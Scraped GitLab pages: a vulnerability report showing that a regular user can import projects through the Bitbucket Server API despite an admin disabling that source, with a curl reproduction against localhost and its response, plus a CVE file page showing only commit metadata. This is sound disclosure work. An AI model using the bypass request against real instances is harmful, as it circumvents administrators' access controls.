=== Content from gitlab.com_673732a9_20250114_201259.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Bypass Disabled Bitbucket Server import source Project Creation

### Summary

As an admin, you can disable `Bitbucket Server` import source in admin page `https://:gitlab_instance/admin/application_settings`

However the user can still import project by using API
This issue is similar to [#29748 (closed)](/gitlab-org/gitlab/-/issues/29748 "ESCALATED: Bypass Disabled Repo by URL Project Creation")

### Steps to reproduce

* As an admin, disable `Bitbucket Server` import source in `/admin/application_settings/general` under  `Visibility and access controls`

[![Screenshot-20210914065956-310x692](data:image/gif;base64...)](/-/project/278964/uploads/d1aeac6919e69e33fc740193f894fe15/Screenshot-20210914065956-310x692.png)

* As a regular user, run the following curl command:

```
âžœ curl --request POST \
  --url "http://localhost:3000/api/v4/import/bitbucket_server" \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: [REDACTED by nmalcolm]" \
  --data '{
    "bitbucket_server_url": "http://localhost:7990",
    "bitbucket_server_username": "admin",
    "personal_access_token": "[REDACTED by nmalcolm]",
    "bitbucket_server_project": "FOO",
    "bitbucket_server_repo": "bish"
}'
```

where:

* `http://localhost:3000` - is local gitlab instance
* `http://localhost:7990` - is local bitbucket server instance (requests to localhost/local networks are allowed for this test)

In my case I got the response

```
{"id":25,"name":"BISH","full_path":"/root/BISH","full_name":"Administrator / BISH","import_source":"http://localhost:7990/projects/FOO/repos/bish/browse","import_status":"scheduled","human_import_status_name":"scheduled","provider_link":"http://localhost:7990/projects/FOO/repos/bish/browse"}
```

and the project was imported anyway.

### Impact

Bypass project creation despite the admin setting explcitily disallow it

### What is the current *bug* behavior?

Bypass project creation despite the admin setting explcitily disallow it

Edited Nov 07, 2021 by [Nick Malcolm](/nmalcolm)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_b34dbec6_20250114_201259.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-39871.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-39871.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-39871.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-39871.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ðŸ¤– GitLab Bot ðŸ¤–'s avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "ðŸ¤– GitLab Bot ðŸ¤–")](/gitlab-bot)

  Oct 01, 2021

  [13456359](/gitlab-org/cves/-/commit/13456359762c839b03b3a65633565a1668fb7cc5)
  [Publishing 0 updated advisories and 2 new advisories](/gitlab-org/cves/-/commit/13456359762c839b03b3a65633565a1668fb7cc5)
  Â·
  13456359

  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored Oct 01, 2021

  13456359

  [Publishing 0 updated advisories and 2 new advisories](/gitlab-org/cves/-/commit/13456359762c839b03b3a65633565a1668fb7cc5)
  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored Oct 01, 2021

Loading


